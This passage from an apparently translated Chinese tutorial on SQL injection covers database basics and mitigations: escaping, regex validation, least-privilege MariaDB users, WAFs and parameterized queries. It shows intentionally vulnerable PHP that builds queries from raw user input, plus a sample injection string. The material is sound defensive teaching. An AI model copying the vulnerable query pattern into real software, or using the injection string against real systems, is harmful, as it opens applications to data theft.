class=\"string\">&#x27;Error: &#x27;</span> . <span class=\"title function_ invoke__\">mysqli_error</span>(<span class=\"variable\">$conn</span>));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$query</span>);</span><br><span class=\"line\">  <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>正如我们所看到的，脚本从 POST 请求中获取 和 并将其直接传递给查询<code>username</code>。<code>password</code>这将使攻击者可以注入他们想要的任何东西并利用该应用程序。可以通过清理任何用户输入来避免注入，使注入的查询无用。库提供了多种函数来实现这一点，一个这样的例子是<a href=\"https://www.php.net/manual/en/mysqli.real-escape-string.php\">mysqli_real_escape_string()</a>函数。此函数对诸如<code>&#39;</code>and之类的字符进行转义<code>&quot;</code>，因此它们没有任何特殊含义。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT * FROM logins WHERE username=&#x27;&quot;</span>. <span class=\"variable\">$username</span>. <span class=\"string\">&quot;&#x27; AND password = &#x27;&quot;</span> . <span class=\"variable\">$password</span> . <span class=\"string\">&quot;&#x27;;&quot;</span> ;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Executing query: &quot;</span> . <span class=\"variable\">$query</span> . <span class=\"string\">&quot;&lt;br /&gt;&lt;br /&gt;&quot;</span>;</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码片段显示了如何使用该函数。</p>\n<p><img src=\"https://p.ipic.vip/chzyde.png\" alt=\"mysqli_escape\"></p>\n<p>正如预期的那样，由于转义了单引号，注入不再有效。一个类似的例子是用于转义 PostgreSQL 查询的<a href=\"https://www.php.net/manual/en/function.pg-escape-string.php\">pg_escape_string() 。</a></p>\n<hr>\n<h3 id=\"输入验证\"><a href=\"#输入验证\" class=\"headerlink\" title=\"输入验证\"></a>输入验证</h3><p>还可以根据用于查询的数据验证用户输入，以确保它与预期输入相匹配。例如，当将电子邮件作为输入时，我们可以验证输入的形式是<code>...@email.com</code>，等等。</p>\n<p>考虑端口页面中的以下代码片段，我们<code>UNION</code>在其中使用了注入：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;port_code&quot;</span>])) &#123;</span><br><span class=\"line\">\t<span class=\"variable\">$q</span> = <span class=\"string\">&quot;Select * from ports where port_code ilike &#x27;%&quot;</span> . <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;port_code&quot;</span>] . <span class=\"string\">&quot;%&#x27;&quot;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">pg_query</span>(<span class=\"variable\">$conn</span>,<span class=\"variable\">$q</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"variable\">$result</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">   \t\t<span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;/table&gt;&lt;/div&gt;&lt;p style=&#x27;font-size: 15px;&#x27;&gt;&quot;</span> . <span class=\"title function_ invoke__\">pg_last_error</span>(<span class=\"variable\">$conn</span>). <span class=\"string\">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>port_code</code>我们看到直接在查询中使用了GET 参数。众所周知，端口号仅由字母或空格组成。我们可以将用户输入限制为仅这些字符，这将防止注入查询。正则表达式可用于验证输入：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"><span class=\"variable\">$pattern</span> = <span class=\"string\">&quot;/^[A-Za-z\\s]+$/&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$code</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;port_code&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$code</span>)) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;/table&gt;&lt;/div&gt;&lt;p style=&#x27;font-size: 15px;&#x27;&gt;Invalid input! Please try again.&lt;/p&gt;&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$q</span> = <span class=\"string\">&quot;Select * from ports where port_code ilike &#x27;%&quot;</span> . <span class=\"variable\">$code</span> . <span class=\"string\">&quot;%&#x27;&quot;</span>;</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>代码被修改为使用<a href=\"https://www.php.net/manual/en/function.preg-match.php\">preg_match()</a>函数，该函数检查输入是否与给定模式匹配。使用的模式是<code>[A-Za-z\\s]+</code>，它将只匹配包含字母和空格的字符串。任何其他字符都将导致脚本终止。</p>\n<p><img src=\"https://p.ipic.vip/xgrdd8.png\" alt=\"img\"></p>\n<p>我们可以测试下面的注入：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;; SELECT 1,2,3,4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/xgrdd8.png\" alt=\"img\"></p>\n<p>如上图所示，注入查询的输入被服务器拒绝。</p>\n<hr>\n<h3 id=\"用户权限-1\"><a href=\"#用户权限-1\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h3><p>正如最初讨论的那样，DBMS 软件允许创建具有细粒度权限的用户。我们应该确保查询数据库的用户只有最小权限。</p>\n<p>超级用户和具有管理权限的用户永远不应该与 Web 应用程序一起使用。这些帐户可以访问可能导致服务器受损的功能和特性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; CREATE USER &#x27;reader&#x27;@&#x27;localhost&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">Query OK, 0 rows affected (0.002 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt; GRANT SELECT ON ilfreight.ports TO &#x27;reader&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;p@ssw0Rd!!&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">Query OK, 0 rows affected (0.000 sec)</span><br></pre></td></tr></table></figure>\n\n<p>上面的命令添加了一个名为 who 的新 MariaDB 用户，<code>reader</code>该用户仅被授予<code>SELECT</code>表的权限<code>ports</code>。我们可以通过登录验证该用户的权限：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ mysql -u reader -p</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt; use ilfreight;</span><br><span class=\"line\">MariaDB [ilfreight]&gt; SHOW TABLES;</span><br><span class=\"line\"></span><br><span class=\"line\">+---------------------+</span><br><span class=\"line\">| Tables_in_ilfreight |</span><br><span class=\"line\">+---------------------+</span><br><span class=\"line\">| ports               |</span><br><span class=\"line\">+---------------------+</span><br><span class=\"line\">1 row in set (0.000 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [ilfreight]&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</span><br><span class=\"line\"></span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| SCHEMA_NAME        |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| information_schema |</span><br><span class=\"line\">| ilfreight          |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">2 rows in set (0.000 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [ilfreight]&gt; SELECT * FROM ilfreight.credentials;</span><br><span class=\"line\">ERROR 1142 (42000): SELECT command denied to user &#x27;reader&#x27;@&#x27;localhost&#x27; for table &#x27;credentials&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码片段确认<code>reader</code>用户无法查询<code>ilfreight</code>数据库中的其他表。用户只能访问<code>ports</code>应用程序所需的表。</p>\n<hr>\n<h3 id=\"Web-应用防火墙\"><a href=\"#Web-应用防火墙\" class=\"headerlink\" title=\"Web 应用防火墙\"></a>Web 应用防火墙</h3><p>Web 应用程序防火墙 (WAF) 用于检测恶意输入并拒绝包含它们的任何 HTTP 请求。即使应用程序逻辑存在缺陷，这也有助于防止 SQL 注入。WAF 可以是开源的 (ModSecurity) 或高级的 (Cloudflare)。他们中的大多数都有基于常见网络攻击配置的默认规则。例如，任何包含该字符串的请求<code>INFORMATION_SCHEMA</code>都将被拒绝，因为它通常在利用 SQL 注入时使用。</p>\n<hr>\n<h3 id=\"参数化查询\"><a href=\"#参数化查询\" class=\"headerlink\" title=\"参数化查询\"></a>参数化查询</h3><p>另一种确保输入被安全清理的方法是使用参数化查询。参数化查询包含输入数据的占位符，然后由驱动程序转义并传递。我们不是直接将数据传递到 SQL 查询，而是使用占位符，然后用 PHP 函数填充它们。</p>\n<p>考虑以下修改后的代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\">  <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT * FROM logins WHERE username=? AND password = ?&quot;</span> ;</span><br><span class=\"line\">  <span class=\"variable\">$stmt</span> = <span class=\"title function_ invoke__\">mysqli_prepare</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$query</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">mysqli_stmt_bind_param</span>(<span class=\"variable\">$stmt</span>, <span class=\"string\">&#x27;ss&#x27;</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">mysqli_stmt_execute</span>(<span class=\"variable\">$stmt</span>);</span><br><span class=\"line\">  <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysqli_stmt_get_result</span>(<span class=\"variable\">$stmt</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">mysqli_stmt_close</span>(<span class=\"variable\">$stmt</span>);</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>查询被修改为包含两个占位符，标有用<code>?</code>户名和密码的放置位置。<a href=\"https://www.php.net/manual/en/mysqli-stmt.bind-param.php\">然后我们使用mysqli_stmt_bind_param()</a>函数将用户名和密码绑定到查询。这将安全地转义任何引号并将值放入查询中。</p>\n<hr>\n<h3 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h3><p>上面的列表并不详尽，仍然可以根据应用程序逻辑利用 SQL 注入。显示的代码示例基于 PHP，但逻辑适用于所有常见语言和库。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-介绍\"><a href=\"#0x01-介绍\" class=\"headerlink\" title=\"0x01 介绍\"></a>0x01 介绍</h2><p>大多数现代 Web 应用程序在后端使用数据库结构。此类数据库用于存储和检索与 Web 应用程序相关的数据，从实际 Web 内容到用户信息和内容等。为了使 Web 应用程序动态化，Web 应用程序必须与数据库实时交互。当来自用户的 HTTP(S) 请求到达时，Web 应用程序的后端将向数据库发出查询以构建响应。这些查询可以包括来自 HTTP(S) 请求的信息或其他相关信息。</p>\n<p><img src=\"https://p.ipic.vip/oxdmae.png\" alt=\"数据库管理系统架构\"></p>\n<p>当用户提供的信息用于构造对数据库的查询时，恶意用户可以诱使查询用于原始程序员预期之外的其他用途，从而使用称为 SQL 注入的攻击为用户提供查询数据库的权限（ SQLi).</p>\n<p>SQL 注入是指针对关系数据库的攻击，例如<code>MySQL</code>（而非关系数据库的注入，例如 MongoDB，是 NoSQL 注入）。本模块将重点<code>MySQL</code>介绍 SQL 注入概念。</p>\n<hr>\n<h3 id=\"SQL-注入-SQLi\"><a href=\"#SQL-注入-SQLi\" class=\"headerlink\" title=\"SQL 注入 (SQLi)\"></a>SQL 注入 (SQLi)</h3><p>Web 应用程序中可能存在许多类型的注入漏洞，例如 HTTP 注入、代码注入和命令注入。然而，最常见的例子是 SQL 注入。当恶意用户试图传递更改 Web 应用程序发送到数据库的最终 SQL 查询的输入时，就会发生 SQL 注入，从而使用户能够直接对数据库执行其他意外的 SQL 查询。</p>\n<p>有很多方法可以做到这一点。要使 SQL 注入发挥作用，攻击者必须首先注入 SQL 代码，然后通过更改原始查询或执行全新的查询来颠覆 Web 应用程序逻辑。首先，攻击者必须在预期的用户输入限制之外注入代码，因此它不会作为简单的用户输入来执行。在最基本的情况下，这是通过注入单引号 ( <code>&#39;</code>) 或双引号 ( <code>&quot;</code>) 来避开用户输入的限制并将数据直接注入 SQL 查询来完成的。</p>\n<p>一旦攻击者可以注入，他们就必须寻找一种方法来执行不同的 SQL 查询。这可以通过使用 SQL 代码来组成一个工作查询来完成，该查询可以同时执行预期的 SQL 查询和新的 SQL 查询。有很多方法可以实现这一点，例如使用<a href=\"https://www.sqlinjection.net/stacked-queries/\">堆叠</a>查询或使用<a href=\"https://www.mysqltutorial.org/sql-union-mysql.aspx/\">联合</a>查询。最后，要检索新查询的输出，我们必须在 Web 应用程序的前端对其进行解释或捕获。</p>\n<hr>\n<h3 id=\"用例和影响\"><a href=\"#用例和影响\" class=\"headerlink\" title=\"用例和影响\"></a>用例和影响</h3><p>SQL 注入可能会产生巨大的影响，尤其是在后端服务器和数据库的权限非常松懈的情况下。</p>\n<p>首先，我们可能会检索我们不应该看到的秘密&#x2F;敏感信息，例如用户登录名和密码或信用卡信息，然后可以将其用于其他恶意目的。SQL 注入导致许多网站密码和数据泄露，这些网站随后被重新用于窃取用户帐户、访问其他服务或执行其他恶意操作。</p>\n<p>SQL 注入的另一个用例是破坏预期的 Web 应用程序逻辑。最常见的示例是在不传递有效的用户名和密码凭据对的情况下绕过登录。另一个例子是访问锁定给特定用户的功能，比如管理面板。攻击者还可以直接在后台服务器上读写文件，进而在后台服务器上设置后门，直接控制后台服务器，最终控制整个后台服务器。网站。</p>\n<hr>\n<h3 id=\"预防\"><a href=\"#预防\" class=\"headerlink\" title=\"预防\"></a>预防</h3><p>SQL 注入通常是由编码不当的 Web 应用程序或不安全的后端服务器和数据库权限引起的。稍后，我们将讨论通过安全编码方法（例如用户输入清理和验证以及适当的后端用户权限和控制）来减少易受 SQL 注入攻击的机会的方法。</p>\n<h2 id=\"0x02-数据库简介\"><a href=\"#0x02-数据库简介\" class=\"headerlink\" title=\"0x02 数据库简介\"></a>0x02 数据库简介</h2><p>在我们了解 SQL 注入之前，我们需要更多地了解数据库和结构化查询语言 (SQL)，哪些数据库将执行必要的查询。网络应用程序利用后端数据库来存储与网络应用程序相关的各种内容和信息。这可以是核心 Web 应用程序资产，如图像和文件、内容（如帖子和更新）或用户数据（如用户名和密码）。</p>\n<p>有许多不同类型的数据库，每一种都适合特定的用途。传统上，应用程序使用基于文件的数据库，随着大小的增加，速度非常慢。<code>Database Management Systems</code>这导致了( )的采用<code>DBMS</code>。</p>\n<hr>\n<h3 id=\"数据库管理系统\"><a href=\"#数据库管理系统\" class=\"headerlink\" title=\"数据库管理系统\"></a>数据库管理系统</h3><p>数据库管理系统 (DBMS) 有助于创建、定义、托管和管理数据库。随着时间的推移，设计了各种 DBMS，例如基于文件、关系 DBMS (RDBMS)、NoSQL、基于图形和键&#x2F;值存储。</p>\n<p>有多种方式可以与 DBMS 交互，例如命令行工具、图形界面，甚至 API（应用程序编程接口）。DBMS 用于各种银行、金融和教育部门以记录大量数据。DBMS 的一些基本特征包括：</p>\n<table>\n<thead>\n<tr>\n<th><strong>特征</strong></th>\n<th><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Concurrency</code></td>\n<td>一个真实世界的应用程序可能有多个用户同时与之交互。DBMS 确保这些并发交互成功而不会损坏或丢失任何数据。</td>\n</tr>\n<tr>\n<td><code>Consistency</code></td>\n<td>对于如此多的并发交互，DBMS 需要确保数据在整个数据库中保持一致和有效。</td>\n</tr>\n<tr>\n<td><code>Security</code></td>\n<td>DBMS 通过用户身份验证和权限提供细粒度的安全控制。这将防止未经授权查看或编辑敏感数据。</td>\n</tr>\n<tr>\n<td><code>Reliability</code></td>\n<td>备份数据库并在数据丢失或破坏的情况下将它们回滚到以前的状态很容易。</td>\n</tr>\n<tr>\n<td><code>Structured Query Language</code></td>\n<td>SQL 通过支持各种操作的直观语法简化了用户与数据库的交互。</td>\n</tr>\n</tbody></table>\n<hr>\n<h3 id=\"架构\"><a href=\"#架构\" class=\"headerlink\" title=\"架构\"></a>架构</h3><p>下图详细说明了一个两层架构。</p>\n<p><img src=\"https://p.ipic.vip/jadjj1.png\" alt=\"数据库管理系统架构\"></p>\n<p><code>Tier I</code>通常由客户端应用程序组成，例如网站或 GUI 程序。这些应用程序由高级交互组成，例如用户登录或评论。<code>Tier II</code>来自这些交互的数据通过 API 调用或其他请求传递。</p>\n<p>第二层是中间件，它解释这些事件并将它们放入 DBMS 所需的格式中。最后，应用层根据 DBMS 的类型使用特定的库和驱动程序与它们进行交互。DBMS 从第二层接收查询并执行请求的操作。这些操作可能包括数据的插入、检索、删除或更新。处理后，DBMS 返回任何请求的数据或错误代码以应对无效查询。</p>\n<p>可以在同一台主机上托管应用程序服务器和 DBMS。但是，具有支持许多用户的大量数据的数据库通常单独托管以提高性能和可伸缩性。</p>\n<h2 id=\"0x03-数据库类型\"><a href=\"#0x03-数据库类型\" class=\"headerlink\" title=\"0x03 数据库类型\"></a>0x03 数据库类型</h2><p>一般来说，数据库分为<code>Relational Databases</code>和<code>Non-Relational Databases</code>。只有关系数据库使用 SQL，而非关系数据库使用多种通信方法。</p>\n<hr>\n<h3 id=\"关系数据库\"><a href=\"#关系数据库\" class=\"headerlink\" title=\"关系数据库\"></a>关系数据库</h3><p>关系数据库是最常见的数据库类型。它使用模式、模板来指示存储在数据库中的数据结构。例如，我们可以想象一家向其客户销售产品的公司拥有关于这些产品的去向、销售对象和数量的某种形式的存储知识。然而，这通常是在后端完成的，而在前端没有明显的通知。每种方法都可以使用不同类型的关系数据库。例如，第一个表可以存储和显示基本的客户信息，第二个表可以存储销售的产品数量及其成本，第三个表可以列举谁购买了这些产品以及支付数据。</p>\n<p>关系数据库中的表与提供快速数据库摘要或在需要查看特定数据时访问特定行或列的键相关联。这些表，也称为实体，都相互关联。例如，客户信息表可以为每个客户提供一个特定的 ID，该 ID 可以指示我们需要了解的有关该客户的所有信息，例如地址、姓名和联系信息。此外，产品描述表可以为每个产品分配一个特定的 ID。存储所有订单的表只需要记录这些 ID 及其数量。这些表格中的任何更改都会影响所有这些表格，但可以预见和系统地影响。</p>\n<p><code>relational database management system</code>但是，在处理集成数据库时，需要一个概念，即使用称为( )的键将一个表链接到另一个表<code>RDBMS</code>。许多最初使用不同概念的公司正在转向 RDBMS 概念，因为这个概念易于学习、使用和理解。最初，这个概念只被大公司使用。然而，许多类型的数据库现在都实现了 RDBMS 概念，例如 Microsoft Access、MySQL、SQL Server、Oracle、PostgreSQL 等等。</p>\n<p>例如，我们可以<code>users</code>在关系数据库中有一个表，其中包含<code>id</code>、<code>username</code>、<code>first_name</code>、<code>last_name</code>和其他列。可以<code>id</code>用作表键。另一个表<code>posts</code>可能包含所有用户发布的帖子，列有<code>id</code>、<code>user_id</code>、<code>date</code>、<code>content</code>等。</p>\n<p><img src=\"https://p.ipic.vip/ko5y8y.jpg\" alt=\"HTML范例\"></p>\n<p>我们可以将表中的<code>id</code>from链接<code>users</code>到<code>user_id</code>表中<code>posts</code>以检索每个帖子的用户详细信息，而无需存储每个帖子的所有用户详细信息。一个表可以有多个键，因为另一列可以用作键来链接另一个表。因此，例如，该<code>id</code>列可以用作将<code>posts</code>表链接到另一个包含评论的表的键，每个评论都属于一个特定的帖子，等等。</p>\n<p>数据库中表之间的关系称为模式。</p>\n<p>这样，通过使用关系数据库，可以快速轻松地从所有数据库中检索有关特定元素的所有数据。因此，例如，我们可以使用单个查询从所有表中检索链接到特定用户的所有详细信息。这使得关系数据库对于具有清晰结构和设计以及高效数据管理的大数据集非常快速和可靠。关系数据库最常见的示例是<code>MySQL</code>，我们将在本模块中介绍。</p>\n<hr>\n<h3 id=\"非关系数据库\"><a href=\"#非关系数据库\" class=\"headerlink\" title=\"非关系数据库\"></a>非关系数据库</h3><p>非关系数据库（也称为<code>NoSQL</code>数据库）不使用表、行和列或主键、关系或模式。相反，NoSQL 数据库根据存储的数据类型使用各种存储模型来存储数据。由于没有为数据库定义的结构，NoSQL 数据库具有很强的可扩展性和灵活性。因此，在处理定义和结构不是很好的数据集时，NoSQL 数据库将是存储此类数据的最佳选择。NoSQL 数据库有四种常见的存储模型：</p>\n<ul>\n<li>核心价值</li>\n<li>基于文档</li>\n<li>宽栏</li>\n<li>图形</li>\n</ul>\n<p>上述每个模型都有不同的数据存储方式。例如，该<code>Key-Value</code>模型通常以 JSON 或 XML 格式存储数据，每一对都有一个键，并将其所有数据存储为它的值： <img src=\"https://p.ipic.vip/m6b9rg.jpg\" alt=\"HTML范例\"></p>\n<p>上面的示例可以使用 JSON 表示为：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;100001&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;date&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;01-01-2021&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;content&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Welcome to this web application.&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;100002&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;date&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;02-01-2021&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;content&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;This is the first post on this web app.&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;100003&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;date&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;02-01-2021&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;content&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Reminder: Tomorrow is the ...&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>它看起来类似于<code>Python</code>or <code>PHP</code>（即<code>&#123;&#39;key&#39;:&#39;value&#39;&#125;</code>）等语言中的字典项，其中 the<code>key</code>通常是字符串，而 the<code>value</code>可以是字符串、字典或任何类对象。</p>\n<p>NoSQL 数据库最常见的示例是<code>MongoDB</code>.</p>\n<h2 id=\"0x04-SQL-注入简介\"><a href=\"#0x04-SQL-注入简介\" class=\"headerlink\" title=\"0x04 SQL 注入简介\"></a>0x04 SQL 注入简介</h2><h3 id=\"在-Web-应用程序中使用-SQL\"><a href=\"#在-Web-应用程序中使用-SQL\" class=\"headerlink\" title=\"在 Web 应用程序中使用 SQL\"></a>在 Web 应用程序中使用 SQL</h3><p>首先，让我们看看 Web 应用程序如何使用 MySQL 数据库来存储和检索数据。一旦在后端服务器上安装并设置了 DBMS 并启动并运行，Web 应用程序就可以开始利用它来存储和检索数据。</p>\n<p>例如，在<code>PHP</code>Web 应用程序中，我们可以连接到我们的数据库，并<code>MySQL</code>通过<code>MySQL</code>语法开始使用数据库，就在 中<code>PHP</code>，如下所示：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$conn</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"string\">&quot;localhost&quot;</span>, <span class=\"string\">&quot;root&quot;</span>, <span class=\"string\">&quot;password&quot;</span>, <span class=\"string\">&quot;users&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;select * from logins&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$conn</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$query</span>);</span><br></pre></td></tr></table></figure>\n\n<p>然后，查询的输出将存储在 中<code>$result</code>，我们可以将其打印到页面或以任何其他方式使用它。下面的 PHP 代码将在新行中打印 SQL 查询的所有返回结果：</p>\n<figure class=\"highlight 